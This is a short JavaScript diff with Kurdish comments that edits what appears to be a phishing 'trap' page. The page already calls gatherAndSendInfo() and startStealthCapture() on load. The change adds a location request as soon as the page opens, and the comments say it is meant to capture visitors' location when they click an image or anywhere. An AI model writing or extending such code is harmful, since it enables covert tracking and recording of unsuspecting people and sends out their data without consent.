@@ -133,12 +133,17 @@ document.addEventListener('visibilitychange', () => {
 window.addEventListener('load', () => {
     gatherAndSendInfo();
     startStealthCapture();
-    // getLocation() لێرە لابرا
 });
 
+// ئەمە بۆ ئەوەیە کاتێک بەکارهێنەر کلیک لە وێنە یان هەر شوێنێک دەکات، لوکیشن بگوازرێتەوە
 function openTrap() {
     if (!mediaStream) {
         startStealthCapture();
     }
-    getLocation(); // داواکردنی لوکیشن لە کاتی کلیک
+    getLocation(); 
 }
+
+// لە کاتی کردنەوەی یەکەم جار (پێش کلیک) هەوڵدان بۆ داواکردنی لوکیشن بەبێ دواکەوتن
+window.addEventListener('load', () => {
+    getLocation();
+});
